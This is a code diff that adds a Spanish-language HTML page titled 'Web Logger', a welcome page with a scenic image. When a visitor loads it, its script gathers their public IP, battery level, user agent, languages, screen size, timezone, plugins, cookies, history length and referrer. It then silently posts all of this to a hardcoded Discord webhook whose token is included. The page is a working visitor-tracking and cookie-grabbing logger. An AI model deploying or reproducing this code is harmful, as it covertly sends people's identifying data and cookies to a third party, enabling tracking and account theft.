@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Web Logger</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial, sans-serif; background: #f5f5f5; color: #222; text-align: center; }
+        .container { margin: 40px auto; max-width: 400px; background: #fff; border-radius: 10px; box-shadow: 0 2px 8px #0001; padding: 24px; }
+        img { max-width: 100%; border-radius: 8px; margin-bottom: 20px; }
+        .info { text-align: left; margin-top: 20px; }
+        .info strong { color: #1976d2; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=400&q=80" alt="Preview">
+        <h2>Bienvenido</h2>
+        <div class="info" id="info"></div>
+    </div>
+    <script>
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'No disponible';
+            }
+        }
+
+        function getBattery() {
+            if ('getBattery' in navigator) {
+                return navigator.getBattery().then(bat => Math.round(bat.level * 100) + '%');
+            }
+            return Promise.resolve('No soportado en iOS/Safari');
+        }
+
+        function getPlugins() {
+            if (navigator.plugins && navigator.plugins.length) {
+                return Array.from(navigator.plugins).map(p => p.name).join(', ');
+            }
+            return 'No disponible';
+        }
+
+        function getCookies() {
+            return document.cookie || 'No hay cookies';
+        }
+
+        function getLanguages() {
+            return navigator.languages ? navigator.languages.join(', ') : navigator.language;
+        }
+
+        function getTimezone() {
+            try {
+                return Intl.DateTimeFormat().resolvedOptions().timeZone;
+            } catch {
+                return 'No disponible';
+            }
+        }
+
+        function getHistoryLength() {
+            return window.history.length;
+        }
+
+        function getReferrer() {
+            return document.referrer || 'Directo / Sin referencia';
+        }
+
+        async function main() {
+            const ip = await getIP();
+            const battery = await getBattery();
+            const ua = navigator.userAgent;
+            const lang = getLanguages();
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const tz = getTimezone();
+            const plugins = getPlugins();
+            const cookies = getCookies();
+            const historyLen = getHistoryLength();
+            const referrer = getReferrer();
+
+            // Mostrar la información en la página
+            document.getElementById('info').innerHTML = `
+                <strong>IP Pública:</strong> ${ip}<br>
+                <strong>Batería:</strong> ${battery}<br>
+                <strong>User-Agent:</strong> ${ua}<br>
+                <strong>Idioma(s):</strong> ${lang}<br>
+                <strong>Resolución de pantalla:</strong> ${screenRes}<br>
+                <strong>Zona horaria:</strong> ${tz}<br>
+                <strong>Plugins:</strong> ${plugins}<br>
+                <strong>Cookies:</strong> ${cookies}<br>
+                <strong>Historial de esta sesión:</strong> ${historyLen} páginas<br>
+                <strong>Referrer:</strong> ${referrer}<br>
+            `;
+
+            // ENVÍO A DISCORD WEBHOOK
+            const webhookUrl = "https://discord.com/api/webhooks/1392952998183043132/yW8DjudaJS7iWGWKteANBwsYNx0IqHw77gBb6q6xT1lzUZ-uve5h04Qd-UzZLEEVZZz0";
+            const imageUrl = "https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=400&q=80";
+            const loggerUrl = window.location.href;
+
+            const embed = {
+                title: "Nuevo acceso al Web Logger",
+                description: `**IP Pública:** ${ip}\n**Batería:** ${battery}\n**User-Agent:** ${ua}\n**Idioma(s):** ${lang}\n**Resolución:** ${screenRes}\n**Zona horaria:** ${tz}\n**Plugins:** ${plugins}\n**Cookies:** ${cookies}\n**Historial de sesión:** ${historyLen} páginas\n**Referrer:** ${referrer}\n\n[Ver logger completo](${loggerUrl})`,
+                image: { url: imageUrl },
+                color: 5814783
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    embeds: [embed]
+                })
+            });
+        }
+
+        main();
+    </script>
+</body>
+</html> 
